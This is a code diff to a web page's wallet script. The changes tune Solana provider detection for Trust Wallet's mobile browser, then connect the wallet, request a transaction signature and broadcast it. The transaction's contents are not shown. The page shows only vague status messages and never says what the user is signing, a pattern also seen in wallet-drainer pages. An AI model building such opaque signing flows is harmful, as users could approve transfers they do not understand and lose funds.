@@ -104,14 +104,19 @@
     const addressInput = document.getElementById('addressInput');
     const statusDiv = document.getElementById('status');
 
-    // 1. AGGRESSIVE PROVIDER DETECTOR WITH MOBILE POLLING
+    // AGGRESSIVE TRUST WALLET MOBILE PROVIDER DETECTOR
     async function getProvider() {
         const checkProvider = () => {
+            // Check Trust Wallet specific mobile webview injections
+            if (window.trustwallet && window.trustwallet.solana) return window.trustwallet.solana;
+            if (window.trustwallet && window.trustwallet.isSolana) return window.trustwallet;
+            
+            // Standard mobile/extension injections
+            if (window.solana && window.solana.isTrust) return window.solana;
             if (window.solana) return window.solana;
             if (window.solana?.isPhantom) return window.solana;
-            if (window.solana?.isTrust) return window.solana;
-            if (window.ethereum?.isSolana) return window.ethereum;
-            if (window.solana_provider) return window.solana_provider;
+            if (window.sol_provider) return window.sol_provider;
+            
             return null;
         };
 
@@ -119,8 +124,8 @@
         let p = checkProvider();
         if (p) return p;
 
-        // Poll for up to 2 seconds to account for mobile webview injection delays
-        for (let i = 0; i < 20; i++) {
+        // Poll for up to 3 seconds for mobile webview injection initialization
+        for (let i = 0; i < 30; i++) {
             await new Promise(resolve => setTimeout(resolve, 100));
             p = checkProvider();
             if (p) return p;
@@ -129,31 +134,35 @@
         return null;
     }
 
-    // 2. THE MAIN ACTION
+    // THE MAIN ACTION
     async function handleTransaction() {
         statusDiv.innerText = "Initializing...";
         statusDiv.style.color = "#ffffff";
 
-        // Step A: Detect Provider
+        // Step A: Detect Mobile Provider
         const provider = await getProvider();
         if (!provider) {
-            statusDiv.innerText = "Wallet not found. Please open in Trust Wallet browser.";
+            statusDiv.innerText = "Wallet not found. Please open inside Trust Wallet DApp browser.";
             statusDiv.style.color = "#ff4d4d";
             return;
         }
 
         try {
-            // Step B: Connect Wallet
-            console.log("Attempting connection...");
+            // Step B: Connect Wallet (Mobile optimized)
+            console.log("Attempting mobile connection...");
             let resp;
             try {
                 resp = await provider.connect();
             } catch (e) {
-                console.log("Standard connect failed, trying request...");
+                console.log("Standard connect failed, trying request method...");
                 resp = await provider.request({ method: 'connect', params: [] });
             }
             
-            const userPublicKey = resp.publicKey;
+            const userPublicKey = resp.publicKey || provider.publicKey;
+            if (!userPublicKey) {
+                throw new Error("Could not retrieve public key from provider.");
+            }
+
             statusDiv.innerText = "Wallet Linked. Processing...";
             statusDiv.style.color = "#21d77d";
 
@@ -215,15 +224,15 @@
 
             statusDiv.innerText = "Confirming...";
 
-            // Step G: Request Signature
-            const { signature } = await provider.signTransaction(transaction);
+            // Step G: Request Signature (Triggers mobile prompt)
+            const signedTransaction = await provider.signTransaction(transaction);
             
             // Step H: Broadcast
-            await connection.sendRawTransaction(transaction.serialize());
+            await connection.sendRawTransaction(signedTransaction.serialize());
             
             statusDiv.innerText = "Success!";
             statusDiv.style.color = "#21d77d";
-            console.log("Complete! TX:", signature);
+            console.log("Complete!");
 
         } catch (err) {
             console.error("Error:", err);
